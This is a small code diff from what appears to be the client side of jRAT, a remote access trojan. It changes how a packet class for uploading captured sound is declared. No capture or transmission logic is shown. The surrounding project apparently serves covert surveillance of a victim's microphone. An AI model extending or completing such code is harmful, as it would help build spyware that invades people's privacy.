@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet58ClientUploadSoundCapture extends AbstractOutgoingPacket {
+public class Packet58ClientUploadSoundCapture implements OutgoingPacket {
 
 	private byte[] data;
 	private int read;
